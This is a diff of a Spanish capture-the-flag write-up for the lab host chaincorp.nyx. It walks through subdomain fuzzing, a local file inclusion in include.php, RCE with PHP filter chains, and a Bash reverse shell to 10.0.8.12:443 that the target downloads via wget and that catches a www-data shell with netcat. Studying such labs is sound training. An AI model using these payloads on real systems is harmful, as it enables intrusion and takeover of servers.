@@ -1,121 +1,138 @@
-lo qu edbemos hacer es añadir alñ etc host el sudnominio que tenemos enumerado en mi caso 
-10.0.8.14      chaincorp.nyx
-ahora vamos a UN BARRIDO CON WFUZZ
-└─$ wfuzz -c --hc=404 --hl=11 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.chaincorp.nyx" -u 10.0.8.14
-ESTE ES EL COMANDO CON ALGUNAS MODIFICACIONES COMO EL 404 PARA OCULTARLO Y LAS LINEAS 11 
- RESULTADO 
-                                                                                                                                                                                                      
-┌──(kali㉿kali)-[~]
-└─$ wfuzz -c --hc=404 --hl=11 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.chaincorp.nyx" -u 10.0.8.14
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
+# 07 - Explotación LFI → PHP Filter Chain → RCE → Reverse Shell (utils.chaincorp.nyx)
 
-Target: http://10.0.8.14/
-Total requests: 207643
+## 1. Añadir subdominio al /etc/hosts
 
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                                                                               
-=====================================================================
+```
+10.0.8.14    chaincorp.nyx
+```
 
-000000001:   400        10 L     35 W       301 Ch      "# directory-list-lowercase-2.3-medium.txt"                                                                                           
-000000003:   400        10 L     35 W       301 Ch      "# Copyright 2007 James Fisher"                                                                                                       
-000000007:   400        10 L     35 W       301 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                                     
-000000012:   400        10 L     35 W       301 Ch      "# on atleast 2 different hosts"                                                                                                      
-000000006:   400        10 L     35 W       301 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                                       
-000000011:   400        10 L     35 W       301 Ch      "# Priority ordered case insensative list, where entries were found"                                                                  
-000000005:   400        10 L     35 W       301 Ch      "# This work is licensed under the Creative Commons"                                                                                  
-000000010:   400        10 L     35 W       301 Ch      "#"                                                                                                                                   
-000000008:   400        10 L     35 W       301 Ch      "# or send a letter to Creative Commons, 171 Second Street,"                                                                          
-000000009:   400        10 L     35 W       301 Ch      "# Suite 300, San Francisco, California, 94105, USA."                                                                                 
-000000013:   400        10 L     35 W       301 Ch      "#"                                                                                                                                   
-000000002:   400        10 L     35 W       301 Ch      "#"                                                                                                                                   
-000000004:   400        10 L     35 W       301 Ch      "#"                                                                                                                                   
-000001897:   400        10 L     35 W       301 Ch      "'"                                                                                                                                   
-000002822:   200        20 L     37 W       628 Ch      "utils"                                                                                                                               
-000003548:   400        10 L     35 W       301 Ch      "%20"                                                                                                                                 
-000004951:   400        10 L     35 W       301 Ch      "$file"        +
-como vemos hemos encontado un subdominio utils curioso por lo que vamos a buscarlo en google 
+## 2. Fuzzing de subdominios con WFUZZ
+
+```
+wfuzz -c --hc=404 --hl=11 \
+  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
+  -H "Host: FUZZ.chaincorp.nyx" \
+  -u http://10.0.8.14
+```
+
+**Resultado relevante:**
+
+```
+200 → utils
+```
+
+Subdominio encontrado:
+
+```
 http://utils.chaincorp.nyx/
-<img width="860" height="595" alt="image" src="https://github.com/user-attachments/assets/906ed34f-9a11-40cb-a0e1-70c79528b8bd" />
+```
 
-vemos que ejecuta comandos preestablecidos como dar ip etc 
-asi que vinedo esto se me ocurre hacer un lfi 
+---
+
+## 3. LFI funcional en include.php
+
+```
 http://utils.chaincorp.nyx/include.php?in=/etc/passwd
-<img width="796" height="640" alt="image" src="https://github.com/user-attachments/assets/53393bc3-6ef4-44c4-832c-6dd1a7df035f" />
+```
 
-Mediante wrappers puedo leer el contenido del archivo include.php y resto de archivos.
-┌──(kali㉿kali)-[~]
-└─$ curl 'http://utils.chaincorp.nyx/include.php?in=php://filter/convert.base64-encode/resource=include.php'
-<pre>
-PHByZT4KPD9waHAKICAkZmlsZSA9ICRfR0VUWyJpbiJdOwogIGlmKGlzc2V0KCRmaWxlKSkKICB7CiAgICBpbmNsdWRlKCIkZmlsZSIpOwogIH0KPz4KPC9wcmU+Cg==</pre>
-me descaargo la herramineta de phpfilterchaingenerator y la pongo en marcha como vemos 
-                                                                                                                                                                                                     
-┌──(kali㉿kali)-[~]
-└─$ ls
-cmdasp.aspx  Documentos  gobuster_pueblomasbonito.txt  Imágenes  nc.exe      php_filter_chain_generator  prueba.txt  shell.exe
-Descargas    Escritorio  hydra.restore                 Música    ncmalo.exe  Plantillas                  Público     Vídeos
-                                                                                                                                                                                                       
-┌──(kali㉿kali)-[~]
-└─$ cd php_filter_chain_generator                                                                           
-                                                                                                                                                                                                       
-┌──(kali㉿kali)-[~/php_filter_chain_generator]
-└─$ ls
-php_filter_chain_generator.py  README.md
-                                                                                                                                                                                                       
-┌──(kali㉿kali)-[~/php_filter_chain_generator]
-└─$ python3 php_filter_chain_generator.py --chain "<?php system('ls -l'); ?>"
-[+] The following gadget chain will generate the following code : <?php system('ls -l'); ?> (base64 value: PD9waHAgc3lzdGVtKCdscyAtbCcpOyA/Pg)
-php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
-  se lometemos a la variable del buscador 
-  <img width="1140" height="336" alt="image" src="https://github.com/user-attachments/assets/fc0cd2bf-8636-4b30-94fa-6795767364b3" />
+---
 
-ahora lo que hacemos es creaar una reverse simple 
-──(kali㉿kali)-[~/php_filter_chain_generator]
-└─$ sudo nano index.html            
-[sudo] contraseña para kali: 
-                                                                                                                                                                                                       
-┌──(kali㉿kali)-[~/php_filter_chain_generator]
-└─$ cat index.html               
+## 4. Lectura del archivo mediante php://filter
+
+```
+curl "http://utils.chaincorp.nyx/include.php?in=php://filter/convert.base64-encode/resource=include.php"
+```
+
+Código vulnerbale encontrado:
+
+```php
+<?php
+  $file = $_GET["in"];
+  if(isset($file)) {
+    include("$file");
+  }
+?>
+```
+
+LFI ejecutable → apto para PHP Filter Chain.
+
+---
+
+## 5. Generación de payload con php_filter_chain_generator
+
+```
+cd php_filter_chain_generator
+python3 php_filter_chain_generator.py --chain "<?php system('ls -l'); ?>"
+```
+
+Devuelve un `php://filter/...` enorme listo para la URL.
+
+---
+
+## 6. Crear la reverse shell a descargar en la víctima
+
+### Archivo index.html:
+
+```bash
 #!/bin/bash
 bash -i >& /dev/tcp/10.0.8.12/443 0>&1
-                                                                                                                                                                                                       
-vamos a levantar un servidor python para que lo decarge 
-                                                                      
-┌──(kali㉿kali)-[~/php_filter_chain_generator]
-└─$ python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
- comando para sacar el churro que pegar en la url 
- ─(kali㉿kali)-[~/php_filter_chain_generator]
-└─$ python3 php_filter_chain_generator.py --chain "<?php system('wget 10.0.8.12'); ?>"
+```
 
-como vemos ha funcionado                                                                                                                                                                                                     
-┌──(kali㉿kali)-[~/php_filter_chain_generator]
-└─$ python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.0.8.14 - - [20/Nov/2025 22:31:53] "GET / HTTP/1.1" 200 -
+### Servidor HTTP para servir el archivo
 
-por lo que ahora  la herramiuenta le metemos para que ejecute nuestro index 
-─(kali㉿kali)-[~/php_filter_chain_generator]
-└─$ python3 php_filter_chain_generator.py --chain "<?php system('bash index.html.1'); ?>"
+```
+python3 -m http.server 80
+```
 
+### Descargar el archivo desde la víctima con payload
 
-ponemos a la esucha para que se conecte ┌──(kali㉿kali)-[~/php_filter_chain_generator]
-└─$ nc -nlvp 443 
+```
+python3 php_filter_chain_generator.py --chain "<?php system('wget 10.0.8.12'); ?>"
+```
 
-listening on [any] 443 ...
+Servidor confirma:
 
-y.............. tachan
-┌──(kali㉿kali)-[~/php_filter_chain_generator]
-└─$ nc -nlvp 443 
+```
+10.0.8.14 - - "GET / HTTP/1.1" 200 -
+```
 
-listening on [any] 443 ...
+---
+
+## 7. Payload final para ejecutar la reverse shell descargada
+
+```
+python3 php_filter_chain_generator.py --chain "<?php system('bash index.html.1'); ?>"
+```
+
+*(wget suele guardar como index.html.1)*
+
+---
+
+## 8. Listener en mi Kali
+
+```
+nc -nlvp 443
+```
+
+---
+
+## 9. Shell conseguida
+
+```
 connect to [10.0.8.12] from (UNKNOWN) [10.0.8.14] 51204
 bash: cannot set terminal process group (445): Inappropriate ioctl for device
 bash: no job control in this shell
-www-data@chain:/var/www/vhost$ 
+www-data@chain:/var/www/vhost$
+```
 
-escalada
+---
 
+## Resumen final
+
+- Subdominio “utils” descubierto por host fuzzing.  
+- LFI sin sanitización.  
+- Lectura del include.php → ejecución arbitraria posible.  
+- PHP Filter Chain → RCE completo.  
+- Descarga del payload vía wget.  
+- Ejecución de reverse shell Bash → acceso como www-data.
 
